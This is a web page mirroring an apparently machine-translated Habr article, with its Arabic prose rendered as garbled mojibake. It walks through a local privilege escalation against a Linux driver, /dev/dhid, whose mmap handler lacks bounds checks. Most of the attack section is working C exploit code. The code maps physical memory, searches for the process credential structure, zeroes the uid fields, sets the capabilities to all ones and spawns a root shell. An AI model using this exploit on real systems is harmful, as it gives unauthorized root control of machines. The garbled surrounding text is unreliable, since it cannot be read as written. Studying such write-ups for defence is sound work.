ุฅูููุง. <br><br><img src="https://habrastorage.org/webt/3v/rk/7x/3vrk7xh2hcwclirw59wcdzihxxe.png" alt="ุตูุฑุฉ"><br><br>  ุจุดูู ุนุงู ุ ูุนุฏ ุงูุฃูุฑ ุถุฑูุฑููุง ูุชุนููู ุงูุฌูุงุฒ ุนูู ุงูุฐุงูุฑุฉ ูุชุญุฏูุฏ ุงูุตูุญุงุช ุญุณุจ ุงูุทูุจ ุ ูุธุฑูุง ูุฃู ุงูุฌูุงุฒ ูุง ูุณุชุฎุฏู ุงูุฐุงูุฑุฉ ุงููุนููุฉ ุนูู ุงูุฅุทูุงู. <br><br>  ูู ูุฐุง ุงูุฑูุฒ ุ ุงูููุงู ุงููุญูุฏ ุงููุซูุฑ ููุงูุชูุงู ูู ุงุณุชุฏุนุงุก ูุธููุฉ remap_pfn_range ุ ูุงูุชู ุชุณูุญ ุจุงูุชุนููู ุงูุฎุทู ูุฐุงูุฑุฉ ุงูุฌูุงุฒ ุนูู ูุณุงุญุฉ ุนููุงู ุงููุณุชุฎุฏู. <br><blockquote style=";text-align:right;direction:rtl">  int remap_pfn_range (struct vm_area_struct * vmaุ virt_add ุทูููุฉ ุบูุฑ ูููุนุฉุ pfn ุทูููุฉ ุบูุฑ ูููุนุฉุ ุญุฌู ุทููู ุบูุฑ ููููุนุ pgprot_t prot)ุ <br><br>  ูุนุฑุถ ุจุงูุชุงุช ุญุฌู ุงูุนูุงููู ุงููุนููุฉ ุ ุจุฏุกูุง ูู ุฑูู ุงูุตูุญุฉ ุงููุญุฏุฏ ุจูุงุณุทุฉ pfn ููุนููุงู ุงูุธุงูุฑู virt_add.  ูุชู ุชุญุฏูุฏ ุจุชุงุช ุงูุฃูุงู ุงููุฑุชุจุทุฉ ุจุงููุณุงุญุฉ ุงูุงูุชุฑุงุถูุฉ ูู prot. </blockquote><br>  ูุงููุนุชุงุฏ ุ ููุธุฑ ุฅูู ุงููุนููุงุช ุงูุชู ูู ุชุชู ูุนุงูุฌุชูุง ูุณุจููุง.  ูุฐู ูู ูุนููุงุช pfn ูุงูุญุฌู ุ ูุงูุชู ุชุชูุญ ููุง ุนุฑุถ ุฃู ููุฏุงุฑ ูู ุงูุฐุงูุฑุฉ ูููุฑุงุกุฉ ูุงููุชุงุจุฉ. <br><br><h3 style=";text-align:right;direction:rtl">  ุงุณุชุบูุงู </h3><br>  ุบูุบูููุบ ูุง ูููู ุงูููุงู ุจู ุญูุงู ุฐูู ุ ููุฌุฆุช ุจุทุฑููุฉ ููููุฉ ููุงุณุชุบูุงู.  ุฅุฐุง ุชูููุง ูู ุงูุนุซูุฑ ุนูู ุจููุฉ ุงูุชุญูู ูู ุงูุฃุฑุตุฏุฉ ูู ุงูุฐุงูุฑุฉ ุ ูุณูุณูุญ ููุง ุฐูู ุจุชุบููุฑ ูุนุฑู ุงููุณุชุฎุฏู ุฅูู 0. ุซู ูุฏุนู shell ุ ูุงูุฐู ุณูู ูููุญูุง shell ุจุงูุชูุงุฒุงุช ูุงููุฉ. <br><br><img src="https://habrastorage.org/webt/of/os/r5/ofosr5umezutxzuvasy8xd-_cqg.png" alt="ุตูุฑุฉ"><br><br>  ุฃููุงู ุ ุชุญูู ููุง ุฅุฐุง ูุงู ุจุฅููุงููุง ุนุฑุถ ูููุฉ ูุจูุฑุฉ ูู ุงูุฐุงูุฑุฉ.  ุณููุชุญ ุงูููุฏ ุงูุชุงูู ุงูุฌูุงุฒ ููุนุฑุถ 0xf0000000 ุจุงูุช ุจุฏุกูุง ูู ุงูุนููุงู 0x40404040 ูููุฑุงุกุฉ ูุงููุชุงุจุฉ ูุน ุฅููุงููุฉ ุงุณุชุฎุฏุงู ูุฐุง ุงูุงูุนูุงุณ ูุน ุงูุนูููุงุช ุงูุฃุฎุฑู ุงูุชู ุชุนูุณ ุงููุงุฆู ููุณู. <br><br><div class="spoiler" style=";text-align:right;direction:rtl">  <b class="spoiler_title">ูุงููู</b> <div class="spoiler_text" style=";text-align:right;direction:rtl"><pre style=";text-align:right;direction:rtl"> <code class="cpp hljs"><span class="hljs-meta"><span class="hljs-meta">#</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">include</span></span></span><span class="hljs-meta"> </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">&lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;sys/types.h&gt; #include &lt;unistd.h&gt; #include &lt;fcntl.h&gt; #include &lt;sys/mman.h&gt; int main(int argc, char * const * argv){ printf("pid: %d\n", getpid()); int fd = open("/dev/dhid", O_RDWR); printf("fd: %d\n", fd); unsigned long size = 0xf0000000; unsigned long start_mmap = 0x40404000; unsigned int * addr = (unsigned int *)mmap((void*)start_mmap, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0x0); printf("mmap address: %lx\n", addr); int stop = getchar(); return 0; }</span></span></span></span></code> </pre> <br></div></div><br>  ุชุฑุฌูุฉ: <code>gcc sh.c -o sh.bin</code> ูููููุง ุฅูู ุงููุถูู.  ุฏุนููุง ุชุดุบููู. <br><br><img src="https://habrastorage.org/webt/vh/d2/u3/vhd2u3vjza59bcxi69drrpwoc9a.png" alt="ุตูุฑุฉ"><br><br>  ุงูุขู ุฏุนูุง ูุฐูุจ ุฅูู ูุญุทุฉ ssh ุฃุฎุฑู ูููุธุฑ ุฅูู ุจุทุงูุฉ ุงูุฐุงูุฑุฉ ููุฐู ุงูุนูููุฉ. <br><br><img src="https://habrastorage.org/webt/6u/mp/v4/6umpv4dzghjv0y1u2lyyy6lad7g.png" alt="ุตูุฑุฉ"><br><br>  ููุง ุชุฑูู ุ ุงูุนููุงู ูู ููุณู ุ ูุชู ูุตู ุงูููุตูุงุช ุงูุฎุงุตุฉ ุจุงููุฑุงุกุฉ ูุงููุชุงุจุฉ ุ ููุฐูู ุงููุดุงุฑูุฉ.  ูุฐู ูู ููุฑุฉ ุงูุนูู.  ูุงูุฎุทูุฉ ุงูุชุงููุฉ ูู ุงูุนุซูุฑ ุนูู ุจููุฉ ุงูุงุนุชูุงุฏุงุช ููุนูููุฉ ูู ุงูุงุนุชุจุงุฑ.  ูููู ุฃู ูุชุถุญ ูู ุงููููู ุฃุนูุงู ุฃู ุงูุณูุฉ ุงููููุฒุฉ ุณุชููู 8 ุฃุฑูุงู ุฌุฑุญู ุจุณุจุจ ูุนุฑูุชูุง ุ ุชุณูุฑ ุนูู ุงูุชูุงูู. <br><br><div class="spoiler" style=";text-align:right;direction:rtl">  <b class="spoiler_title">ูุงููู</b> <div class="spoiler_text" style=";text-align:right;direction:rtl"><pre style=";text-align:right;direction:rtl"> <code class="cpp hljs"><span class="hljs-meta"><span class="hljs-meta">#</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">include</span></span></span><span class="hljs-meta"> </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">&lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;sys/types.h&gt; #include &lt;unistd.h&gt; #include &lt;fcntl.h&gt; #include &lt;sys/mman.h&gt; int main(int argc, char * const * argv){ printf("pid: %d\n", getpid()); int fd = open("/dev/dhid", O_RDWR); printf("fd: %d\n", fd); unsigned long size = 0xf0000000; unsigned long start_mmap = 0x40404000; unsigned int * addr = (unsigned int *)mmap((void*)start_mmap, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0x0); printf("mmap address: %lx\n", addr); unsigned int uid = getuid(); unsigned int cred_cur = 0; unsigned int cred_iter = 0; while (((unsigned long)addr) &lt; (start_mmap + size - 0x40)){ cred_cur = 0; if( addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid ){ cred_iter++; printf("found struct... ptr: %p, cred_iter: %d\n", addr, cred_iter); } addr++; } fflush(stdout); int stop = getchar(); return 0; }</span></span></span></span></code> </pre> <br></div></div><br>  ูููุฐุง ูุฌุฏูุง 19 ููุงูู ููุงุซูุฉ. <br><br><img src="https://habrastorage.org/webt/rj/j5/pl/rjj5plsfirobcfwqzc8vss-svtc.png" alt="ุตูุฑุฉ"><br><br>  ูุญู ุงูุขู ุจุญุงุฌุฉ ุฅูู ุฅุนุงุฏุฉ ูุชุงุจุฉ ูู ุงููุนุฑูุงุช ุฅูู 0. ุจุนุฏ ุฅุนุงุฏุฉ ูุชุงุจุฉ ุงููุนุฑู ุงูุฎุงุต ุจูููู ูุนูู ุ ุณูู ูุชุญูู ูู ูุนุฑู ุงููุณุชุฎุฏู ุงูุฎุงุต ุจูุง.  ุจูุฌุฑุฏ ุฃู ูุตุจุญ ูุนุฑู ุงููุณุชุฎุฏู ูุณุงูู 0 ุ ูููููุง ุฃู ููุชุฑุถ ุฃููุง ูุฌุฏูุง ุงุฆุชูุงูุงุช ุจููุฉ ุงูุนูููุฉ ุงูุชู ูุญุชุงุฌูุง. <br><br><div class="spoiler" style=";text-align:right;direction:rtl">  <b class="spoiler_title">ูุงููู</b> <div class="spoiler_text" style=";text-align:right;direction:rtl"><pre style=";text-align:right;direction:rtl"> <code class="cpp hljs"><span class="hljs-meta"><span class="hljs-meta">#</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">include</span></span></span><span class="hljs-meta"> </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">&lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;sys/types.h&gt; #include &lt;unistd.h&gt; #include &lt;fcntl.h&gt; #include &lt;sys/mman.h&gt; int main(int argc, char * const * argv){ printf("pid: %d\n", getpid()); int fd = open("/dev/dhid", O_RDWR); printf("fd: %d\n", fd); unsigned long size = 0xf0000000; unsigned long start_mmap = 0x40404000; unsigned int * addr = (unsigned int *)mmap((void*)start_mmap, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0x0); printf("mmap address: %lx\n", addr); unsigned int uid = getuid(); unsigned int cred_cur = 0; unsigned int cred_iter = 0; while (((unsigned long)addr) &lt; (start_mmap + size - 0x40)){ cred_cur = 0; if( addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid ){ cred_iter++; printf("found struct... ptr: %p, crednum: %d\n", addr, cred_iter); cred_cur = 0; addr[cred_cur++] = 0; addr[cred_cur++] = 0; addr[cred_cur++] = 0; addr[cred_cur++] = 0; addr[cred_cur++] = 0; addr[cred_cur++] = 0; addr[cred_cur++] = 0; addr[cred_cur++] = 0; if (getuid() == 0){ printf("found current struct... ptr: %p, crednum: %d\n", addr, cred_iter); break; } else{ cred_cur = 0; addr[cred_cur++] = uid; addr[cred_cur++] = uid; addr[cred_cur++] = uid; addr[cred_cur++] = uid; addr[cred_cur++] = uid; addr[cred_cur++] = uid; addr[cred_cur++] = uid; addr[cred_cur++] = uid; } } addr++; } fflush(stdout); int stop = getchar(); return 0; }</span></span></span></span></code> </pre> <br></div></div><br><img src="https://habrastorage.org/webt/1x/62/eq/1x62eqetpojbwrrimgaguepynb4.png" alt="ุตูุฑุฉ"><br><br>  ุงูุขู ุ ุจุนุฏ ุงูุนุซูุฑ ุนูู ุงูุจููุฉ ุงูุชู ูุญุชุงุฌูุง ุ ุณูููู ุจุชุบููุฑ uid ุฅูู 0xffffffff ููุฏุนู shell bash ูู ุฎูุงู ูุธููุฉ exec. <br><br><div class="spoiler" style=";text-align:right;direction:rtl">  <b class="spoiler_title">ูุงููู</b> <div class="spoiler_text" style=";text-align:right;direction:rtl"><pre style=";text-align:right;direction:rtl"> <code class="cpp hljs"><span class="hljs-meta"><span class="hljs-meta">#</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">include</span></span></span><span class="hljs-meta"> </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">&lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;sys/types.h&gt; #include &lt;unistd.h&gt; #include &lt;fcntl.h&gt; #include &lt;sys/mman.h&gt; int main(int argc, char * const * argv){ printf("pid: %d\n", getpid()); int fd = open("/dev/dhid", O_RDWR); printf("fd: %d\n", fd); unsigned long size = 0xf0000000; unsigned long start_mmap = 0x40404000; unsigned int * addr = (unsigned int *)mmap((void*)start_mmap, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0x0); printf("mmap address: %lx\n", addr); unsigned int uid = getuid(); unsigned int cred_cur = 0; unsigned int cred_iter = 0; while (((unsigned long)addr) &lt; (start_mmap + size - 0x40)){ cred_cur = 0; if( addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid ){ cred_iter++; printf("found struct... ptr: %p, crednum: %d\n", addr, cred_iter); cred_cur = 0; addr[cred_cur++] = 0; addr[cred_cur++] = 0; addr[cred_cur++] = 0; addr[cred_cur++] = 0; addr[cred_cur++] = 0; addr[cred_cur++] = 0; addr[cred_cur++] = 0; addr[cred_cur++] = 0; if (getuid() == 0){ printf("found current struct... ptr: %p, crednum: %d\n", addr, cred_iter); cred_cur += 1; addr[cred_cur++] = 0xffffffff; addr[cred_cur++] = 0xffffffff; addr[cred_cur++] = 0xffffffff; addr[cred_cur++] = 0xffffffff; addr[cred_cur++] = 0xffffffff; addr[cred_cur++] = 0xffffffff; addr[cred_cur++] = 0xffffffff; addr[cred_cur++] = 0xffffffff; addr[cred_cur++] = 0xffffffff; addr[cred_cur++] = 0xffffffff; execl("/bin/sh","-", (char *)NULL); break; } else{ cred_cur = 0; addr[cred_cur++] = uid; addr[cred_cur++] = uid; addr[cred_cur++] = uid; addr[cred_cur++] = uid; addr[cred_cur++] = uid; addr[cred_cur++] = uid; addr[cred_cur++] = uid; addr[cred_cur++] = uid; } } addr++; } fflush(stdout); int stop = getchar(); return 0; }</span></span></span></span></code> </pre> <br></div></div><br><img src="https://habrastorage.org/webt/mn/zl/xq/mnzlxqz8pj4qafv_w0jznrhb0_e.png" alt="ุตูุฑุฉ"><br><br>  ุญุตููุง ุนูู ุงูุฌุฐุฑ.  ูู ุงููุงูุน ุ ูุฐู ุขูุฉ ูุนูุฏุฉ ููุบุงูุฉ ุชุชุทูุจ ุชุทูุฑุงู ููุชุนุงูู ูุน ูุฐุง ุงูุฅุตุฏุงุฑ ูู LPE. <br><br>  ุจุงูุทุจุน ุ ูุงู ูู ุงูุตุนุจ ููุบุงูุฉ ุงูุญุตูู ุนูู ุงุณุชุบูุงู ูุดููุฉ ุนุฏู ุงูุญุตุงูุฉ ูู ุจุฑูุงูุฌ ุงูุชุดุบูู ุ ูุฃูุง ููุชู ูููุฌุชูุน ุงูุฐู ุณุงุนุฏูู ูุน ุชูููุญ ุญูู ููููุฉ ุงููุตูู ุฅูู ุจุฑูุงูุฌ ุงูุชุดุบูู ููุดุงุฑูุฉ ููุงู ุญูู ุงุณุชุบูุงู ูุดููุฉ ุนุฏู ุงูุญุตุงูุฉ ููุงุซูุฉ ูู mmap. <br><br>  ูู ูุฌุจ ุนูู ููุงุตูุฉ ูุดุฑ ุชุญููู ุงูุฃุฌูุฒุฉ ุงููุฑุณูุฉ ููุฒูุฏ ูู ุงููุนุงูุฌุฉุ  ููููู ุงูุงูุถูุงู ุฅูููุง ุนูู <a href="https://t.me/RalfHackerChannel" rel="nofollow">Telegram</a> .  ูููุฌูุน ูุฌุชูุนูุง ุณูููู ููู ุฃุดุฎุงุต ุนูู ุฏุฑุงูุฉ ุจุงูุนุฏูุฏ ูู ูุฌุงูุงุช ุชูููููุฌูุง ุงููุนูููุงุช ุ ุซู ูููููุง ุฏุงุฆููุง ูุณุงุนุฏุฉ ุจุนุถูุง ุงูุจุนุถ ูู ุฃู ูุถุงูุง ุชุชุนูู ุจุชูููููุฌูุง ุงููุนูููุงุช ูุฃูู ุงููุนูููุงุช. </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/ar480454/">https://habr.com/ru/post/ar480454/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../ar480432/index.html">ูุดููุฉ ุงูุนุงุฑุถ ุงูุฃูู ุ ุฃู ุงูุชุญููู ุงูุตุนุจ ูุชุฏููุงุช ููุฏูู WebRTC ุฅูู HLS</a></li>
<li><a href="../ar480438/index.html">ุงูุฃุญุฏุงุซ ุงูุฑูููุฉ ูู ููุณูู ูู ุงููุชุฑุฉ ูู 16 ุฅูู 22 ุฏูุณูุจุฑ</a></li>
<li><a href="../ar480440/index.html">ุงูุฃุญุฏุงุซ ุงูุฑูููุฉ ูู ุณุงู ุจุทุฑุณุจุฑุฌ ูู 16 ุฅูู 22 ุฏูุณูุจุฑ</a></li>
<li><a href="../ar480446/index.html">ูุชุงุจุฉ ุบุฑุงูุงูุง ุงููููู ุงูุนูุณู ุนูู ุงูุฐูุงุจ</a></li>
<li><a href="../ar480452/index.html">ููุงุก OWASP Moscow ุฑูู 9: ุณุฌูุงุช ุงูุฃุฏุงุก</a></li>
<li><a href="../ar480458/index.html">ุดุงูุฏ "ุฎููุฉ ุงูุฒูู"</a></li>
<li><a href="../ar480460/index.html">ุงูุญู ุงูุฃุณุงุณู ููุธุงู ุงููุนุงุฏูุงุช ุงูุฎุทูุฉ. ุนุฑุถ ุงูุฌุงูุจ</a></li>
<li><a href="../ar480466/index.html">ููุงุตูุงุช ูุญูู: ูุณุงุฑ ุฌุฏู</a></li>
<li><a href="../ar480480/index.html">ููู ุชุนูู ุงููู ุงูููุจููุชุฑุงุช. ูุถุน ุงููุบุฒ ูุนุง</a></li>
<li><a href="../ar480482/index.html">ููููุฉ ุจูุงุก ุฌูุงุฒ ููุจููุชุฑ ู ML</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>